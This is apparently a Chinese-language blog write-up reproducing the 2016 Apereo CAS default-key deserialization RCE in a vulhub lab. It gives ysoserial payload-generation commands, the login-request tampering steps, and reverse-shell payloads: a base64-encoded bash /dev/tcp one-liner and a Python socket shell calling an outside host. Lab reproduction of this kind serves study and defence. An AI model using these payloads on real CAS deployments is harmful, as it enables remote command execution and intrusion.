## 前言

最近也是在工作中遇到这个漏洞，之前没接触过，而且这个漏洞也比较老了，是2016年发现的，并且是基于反序列化产生的，所以就打算学习并且做一下复现，如果以后再遇到的时候能够知道该如何分析。

## 0x01 Apereo cas简介

Apereo CAS 单点登陆系统是Java服务器环境下使用较为广泛的单点登陆系统。

CAS 全程Central Authentication Service（中心认证服务），是一个单点登录协议，Apereo CAS是实现该协议的软件包。

单点登录定义

单点登录(Single sign
on)，英文名称缩写SSO，SSO的意思就是在多系统的环境中，登录单方系统，就可以在不用再次登录的情况下访问相关受信任的系统，也就是说只要登录一次单体系统就可以。

## 0x02 漏洞简介

最早发现此漏洞的文章：<https://apereo.github.io/2016/04/08/commonsvulndisc/>

漏洞成因是在4.1.7版本以前一直存在一个默认密钥问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，从而执行任意命令。

Apereo CAS 4.1.X~4.1.6 默认密钥

Apereo CAS 4.1.7~4.2.X KEY随机生成

## 0x03漏洞利用与复现

Webflow中使用了默认密钥changeit，所以我们就可以利用默认密钥生成序列化对象。

![1668417960_637209a8c4888b8abf57b.png!small](https://image.3001.net/images/20221114/1668417960_637209a8c4888b8abf57b.png!small)

环境：安装了vulhub的kali

工具：apereo-cas-attack、burpsuite

Apereo-cas-attaack：使用ysoserial的CommonsCollections4生成加密后的Payload

### 启动vulhub中的Apereo cas环境

cd /vulhub/apereo-cas/4.1-rce

docker-compose up -d //启动docker环境

![1668417075_637206331bd976aa735c1.png!small](https://image.3001.net/images/20221114/1668417075_637206331bd976aa735c1.png!small)

### 使用工具生成payload

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch
/tmp/sucess"

![1668417087_6372063f1e35cac638ca1.png!small](https://image.3001.net/images/20221114/1668417087_6372063f1e35cac638ca1.png!small)

### 进入主页并抓包，替换execution

http://192.168.0.112:8080/cas/login

![1668417101_6372064dd2e01683805e9.png!small](https://image.3001.net/images/20221114/1668417101_6372064dd2e01683805e9.png!small)

![1668417227_637206cbec8a2216215f6.png!small](https://image.3001.net/images/20221114/1668417227_637206cbec8a2216215f6.png!small)

### 进入容器，在/tmp目录创建了success文件，说明成功利用

docker exec -it <容器ID> /bin/bash

docker ps -a //查找容器ID，一串字符串的就是ID

![1668417238_637206d61eafe3e1176b9.png!small](https://image.3001.net/images/20221114/1668417238_637206d61eafe3e1176b9.png!small)

### 其他利用方式

①反弹shell，bash -i >& /dev/tcp/ip/port 0>&1，payload如下

    
    
    java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c  {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMy83Nzc3IDA+JjE=} | {base64,-d} | {bash,-i}"

![1668418301_63720afdd2ea23f67e516.png!small](https://image.3001.net/images/20221114/1668418301_63720afdd2ea23f67e516.png!small)

![1668418334_63720b1ed065e723d1918.png!small](https://image.3001.net/images/20221114/1668418334_63720b1ed065e723d1918.png!small)

![1668418348_63720b2c1572b994e9f72.png!small](https://image.3001.net/images/20221114/1668418348_63720b2c1572b994e9f72.png!small)

python生成的payload如下，然后直接替换execution后即可反弹成功：

    
    
    python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.3',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);

②回显与检测

目的：网站所在系统环境无法出网，回显可以直接看到命令执行的返回内容。

使用魔改工具ysoserial-mangguogan-master，Payload如下，然后将编码后的数据替换execution，并且在请求头中添加cmd：whoami等命令，查看回显。

    
    
    java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonsCollections4

![1668417483_637207cb7ac9614cac5a8.png!small](https://image.3001.net/images/20221114/1668417483_637207cb7ac9614cac5a8.png!small)

![1668417489_637207d1e3f928750678a.png!small](https://image.3001.net/images/20221114/1668417489_637207d1e3f928750678a.png!small)

参考： 反弹shell <https://www.cnblogs.com/Qixiansheng/p/15474651.html>

回显与检测 <https://xz.aliyun.com/t/8260?page=5>

附：kali的vulhub搭建

<https://www.cnblogs.com/lxfweb/p/12952490.html>

## 0x04漏洞危害

任意命令执行

## 0x05漏洞修复

> 修改默认密钥
>
> 升级Apereo CAS版本

注意：漏洞利用成功响应头回显是500，并且响应体中会有正常的数据。

![1668417533_637207fd6deacf72f1d4c.png!small](https://image.3001.net/images/20221114/1668417533_637207fd6deacf72f1d4c.png!small)

  

